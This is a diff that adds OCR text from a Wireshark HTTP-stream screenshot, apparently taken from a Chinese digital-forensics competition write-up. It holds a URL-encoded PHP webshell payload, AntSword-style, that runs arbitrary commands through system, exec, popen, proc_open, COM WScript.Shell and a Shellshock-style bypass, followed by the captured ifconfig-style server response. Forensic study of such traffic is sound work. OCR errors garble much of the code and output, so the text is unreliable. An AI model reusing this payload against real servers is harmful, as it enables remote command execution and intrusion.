@@ -1,0 +1,55 @@
+# OCR: 979dfaa4199af8b01200b4a5dfb316a1.webp
+# 来源: ./02-WriteUp/2024/2024-电子取证比武-复盘/979dfaa4199af8b01200b4a5dfb316a1.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:15
+
+Wireshark·追踪HTTP流(tcp.streameq148)·tcpdump_tj.cap
+e%7B%40putenv（%22PATH%3D%22.getenv（%22PATH%22).%22%3BC%3A%2FWindows%2Fsystem32%3BC%3A%2FWindows%2FSysWOw64%3BC%3A%2FWindows%3BC%3A%2FWindows%2FSystem32%2FWindowsPowerShe11%2F v1.0%2F%3B%22)%3B%7Dif(!empty(%24envstr))%7B%24envarr%3Dexplode(%22%7C%7C%7Casline%7C%7C%7C%22%2C%20%24envstr）)%3Bforeach(%24envarr%20as%20%24v)%20%7Bif%20(!empty(%24v))%20%7B%48putenv（str_replace（%22%7C%7C%7Caskey%7C%7C%7C%22%2C%20%22%3D%22%2C%2e%24v）)%3B%7D%7D%7D%24r%3D%22%7B%24p%7D%20%7B%24c%7D%22%3Bfunction%2efe（%24f）)%7B%24d%3Dexp1ode（%22%2C%2 2%2C%40ini_get(%22disable_functions%22))%3Bif(empty(%24d))%7B%24d%3Darray()%3B%7Delse%7B%24d%3Darray_map("trim'%2Carray_map(strtolower%2C%24d))%3B%7Dreturn(function_exists(%24f）%26%26is_ca1lable（%24f）%26%26!in_array（%24f%2C%24d))%3B%7D%3Bfunction%20runshe11shock（%24d%2C%2e%24c)%28%7Bif%2e（substr（%24d%2C%200%2C%201）%28%3D%3D%28%22%2F%22%20%26%26%20fe（putenv）%20%26%26%20（fe（error_1og）%2%7C%7C%20fe(mai1'）)）%28%7Bif%2e（strstr(readiink（%22%2Fbin%2Fsh%22）%2C%20%22bash%22)%2e1%3D%20FALSE）%2e%7B%24tmp%20%3D%20tempnam(sys_get_temp_dir()%2C%2eas)%3Bputenv(%22PHP_L0L%3D()%20%7B%20x%3B%20%7D%3B%20%24c%2e%3E%24tmp%202%3E%261%22)%3Bif%2e(fe(error_1og))%20%7Berror_1og（%22a%22%2C%201)%3B%7D% 20e1se%20%7Bmai1(%22a%4e127.e.e.1%22%2C%20%22%22%2C%28%22%22%2C%20%22-b%22)%3B%7D%7D%20else%20%7Breturn%20False%3B%7D%24output%20%3D%20%40fi1e_get_contents(%24tmp)%3B%40un1i nk（%24tmp）%3Bif%2e（%24output%2e!%3D%20%22%22)%20%7Bprint（%24output）)%3Breturn%20True%3B%7D%7Dreturn%20False%3B%7D%3Bfunction%20runcmd（%24c）%7B%24ret%3D0%3B%24d%3Ddirname（%24_S ERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(fe('system'))%7B%40system(%24c%2C%24ret)%3B%7Delseif(fe(passthru'))%7B%40passthru(%24c%2C%24ret)%3B%7Delseif(fe('she11_exec'))%7Bprint(%40shel1_exec(%24c）)%3B%7Delseif(fe(exec）)%7B%40exec(%24c%2C%240%2C%24ret)%3Bprint(join(%22%0A%22%2C%240))%3B%7Delseif(fe('popen'))%7B%24fp%3D%4epopen(%24c%2c'r)%3Bwhile(%40feof(%24fp）)%7Bprint(%40fgets(%24fp%2C2048）)%3B%7D%40pclose(%24fp)%3B%7Delseif(fe（'proc_open'）)%7B%24p%20%3D%20%40proc_open(%24c%2C%20array(1%20%3D%3E%20array(pipe%2C%2 ew）%2C%202%2e%3D%3E%2earray（'pipe%2C%2e'w））%2C%2e%24io）%3Bwhile（1%40feof（%24i0%5B1%5D））%7Bprint（%4efgets（%24io%5B1%5D%2C2848））)%3B%7Dwhile（1%4feof（%24io%5B2%5D））%7Bprint(%40fgets(%24io%5B2%5D%2C2048))%3B%7D%40fclose(%24io%5B1%5D)%3B%40fclose(%24i0%5B2%5D)%3B%40proc_close(%24p）%3B%7Delseif(fe(antsystem))%7B%40antsystem(%24c)%3B%7De1seif(runs hel1shock(%24d%2C%20%24c))%28%7Breturn%20%24ret%3B%7Delseif(substr(%24d%2Co%2C1)1%3D%22%2F%22%20%26%26%20%4class_exists(%22c0M%22）)%7B%24w%3Dnew%20c0M(wScript.she11')%3B%24 e%3D%24w-%3Eexec(%24c）%3B%24so%3D%24e-%3EStdOut()%3B%24ret.%3D%24so-%3EReadA11()%3B%24se%3D%24e-%3EStdErr（)%3B%24ret.%3D%24se-%3EReadA11()%3Bprint(%24ret）%3B%7Delse%7B%24ret% 20%3D%20127%3B%7Dreturn%20%24ret%3B%7D%3B%24ret%3D%4eruncmd(%24r.%22%2e2%3E%261%22)%3Bprint%20（%24ret！%3D0）%3F%22ret%3D%7B%24ret%7D%22%3A%22%22%3B%3B%7Dcatch（Exception%20%24e
+)%7Becho%2e%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3BHTTP/1.12eeK Server: nginx
+Date:Fri,04Mar2022e7:19:1eGMT Content-Type:text/html;charset-UTF-8
+Transfer-Encoding: chunked Connection:close
+Vary:Accept-Encoding Content-Encoding:gzip
+1a35=4163<UP,BROADCAST,RUNNINGMULTICAST>
+81fdf7c5aens33:
+mtu156
+192.168.100.100
+broadcast 192.168.10o.255
+inet
+netmask255.255.255.0
+inet6fe8o:i5642:5868:de23:af71prefixlen64scopeidex20<link> ether ee:0c:29:7f:1b:2d
+txqueuelen1oee
+(Ethernet)
+RXpackets16207
+bytes16770765(15.9MiB)
+overrunseframee
+Rx errorsedroppede TX packets 10891
+bytes19482928(18.5MiB)
+Txerrors edropped eoverruns ecarrier ecollisionse
+1o:flags=73<UP,L00PBACK,RUNNING>mtu 65536
+inet 127.0.0.1netmask255.0.0.0
+prefixlen128scopeidex1e<host>
+inet6 ::1
+looptxqueuelen1(LocalLoopback)
+bytes 6260(6.1KiB)
+RXpackets72
+Rxerrorsedroppedeoverrunse
+frame
+Txpackets72bytes 626e (6.1KiB)
+Tx errorsedroppedoverrunse
+9f7dd
+/ww/wwwroot/www.tpshop.com/application
+dea75af74315 b2f3de6
+分起8605，1套户持分组，1服务器分起，
+，1tum(sl点击适择
+整个对话（6078bytes）查找：
+carrier e collisions e
+ASCII
+Show dataas
+滤掉此流
+打印
+另存为..
+返回
+关闭
+x A
+流148图查找下一个(N)
+助
